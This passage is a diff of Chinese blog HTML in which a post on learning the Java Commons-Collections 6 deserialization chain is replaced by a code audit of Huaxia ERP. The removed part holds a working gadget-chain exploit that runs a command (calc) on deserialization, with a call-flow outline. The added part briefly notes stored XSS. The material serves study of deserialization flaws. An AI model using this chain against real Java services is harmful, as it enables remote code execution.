<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;suibian&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;nbc1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">finHash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        finHash.put(tiedMapEntry,<span class="string">&quot;nbc2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;nbc1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(finHash);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="调试问题"><a href="#调试问题" class="headerlink" title="调试问题"></a>调试问题</h2><p>如果调试的时候发现序列化的时候就弹计算器了，这是因为idea自带的会触发toString方法，点掉就行</p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>因为filter里并没有对XSS做什么特殊处理，所以有很多页面存下来的内容都成了存储型XSS</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406182245314.png"
-                        alt="image-20240406182245314"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220172433781.png"
+                        alt="image-20250220172433781"
                  ></p>
-<p>导致直接调用了</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406182303722.png"
-                        alt="image-20240406182303722"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220172907123.png"
+                        alt="image-20250220172907123"
                  ></p>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">	HashMap.put()</span><br><span class="line">	HashMap.hash()</span><br><span class="line">		TiedMapEntry.hashCode()</span><br><span class="line">		TiedMapEntry.getValue()</span><br><span class="line">			LazyMap.get()</span><br><span class="line">				ChainedTransformer.transform()</span><br><span class="line">					InvokerTransformer.transform()</span><br><span class="line">						Runtime.exec()</span><br></pre></td></tr></table></figure>
-
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240406183441935.png"
-                        alt="image-20240406183441935"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220173138727.png"
+                        alt="image-20250220173138727"
                  ></p>
+<h4 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h4><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220173548765.png"
+                        alt="image-20250220173548765"
+                 ></p>
+<p>没找到</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/" >https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/<i class="fas fa-external-link-alt"></i></a></p>
 
                     
                 </div>
@@ -498,11 +707,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                Java_Commons-Collections 6 学习过程
+                JAVA代码审计 华夏ERP
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2026/03/02/Java_Commons-Collections 6 学习过程/
+                2026/03/02/JAVA代码审计 华夏ERP/
             </div>
         </div>
 
@@ -518,7 +727,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2026-03-02 14:23</div>
+                <div class="content">2026-03-02 17:00</div>
             </div>
 
 
@@ -596,14 +805,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2026/03/02/Java_Commons-Collections%207%20%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/"
-                                   title="Java_Commons-Collections 7 学习过程"
+                                   href="/2026/03/02/SU_photogallery%20Wp/"
+                                   title="一次有意思的出题 SU_photogallery Wp"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">Java_Commons-Collections 7 学习过程</span>
+                                        <span class="post-nav-title-item text-ellipsis">一次有意思的出题 SU_photogallery Wp</span>
                                         <span class="post-nav-item">上一篇</span>
                                     </span>
                                 </a>
@@ -613,11 +822,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2026/03/02/Java_Commons-Collections%205%20%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/"
-                                   title="Java_Commons-Collections 5 学习过程"
+                                   href="/2026/03/02/%E4%B8%80%E6%AC%A1%E7%A0%94%E7%A9%B6%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E8%BF%87%E7%A8%8B/"
+                                   title="一次研究如何获得wifi密码的过程"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">Java_Commons-Collections 5 学习过程</span>
+                                        <span class="post-nav-title-item text-ellipsis">一次研究如何获得wifi密码的过程</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -645,7 +854,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-text">链子分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5"><span class="nav-text">第一阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5"><span class="nav-text">第二阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5"><span class="nav-text">第三阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tnnd%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%BC%B9"><span class="nav-text">tnnd为什么不弹</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88Exp"><span class="nav-text">最终Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="nav-text">调试问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-text">流程</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP"><span class="nav-text">JAVA代码审计 华夏ERP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text">审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Breadme"><span class="nav-text">看readme</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bpom"><span class="nav-text">看pom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bfilter"><span class="nav-text">看filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text">审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-text">fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BA%E5%BC%80%E9%A6%99%E6%A7%9F%E7%89%88"><span class="nav-text">半场开香槟版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%89%88"><span class="nav-text">成功版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ignoredUrls"><span class="nav-text">ignoredUrls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#allowUrls"><span class="nav-text">allowUrls</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j2"><span class="nav-text">log4j2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -823,7 +1032,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-text">链子分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5"><span class="nav-text">第一阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5"><span class="nav-text">第二阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5"><span class="nav-text">第三阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tnnd%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%BC%B9"><span class="nav-text">tnnd为什么不弹</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88Exp"><span class="nav-text">最终Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="nav-text">调试问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-text">流程</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP"><span class="nav-text">JAVA代码审计 华夏ERP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text">审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Breadme"><span class="nav-text">看readme</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bpom"><span class="nav-text">看pom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bfilter"><span class="nav-text">看filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text">审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-text">fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BA%E5%BC%80%E9%A6%99%E6%A7%9F%E7%89%88"><span class="nav-text">半场开香槟版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%89%88"><span class="nav-text">成功版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ignoredUrls"><span class="nav-text">ignoredUrls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#allowUrls"><span class="nav-text">allowUrls</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j2"><span class="nav-text">log4j2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
     </div>
 </div>
 
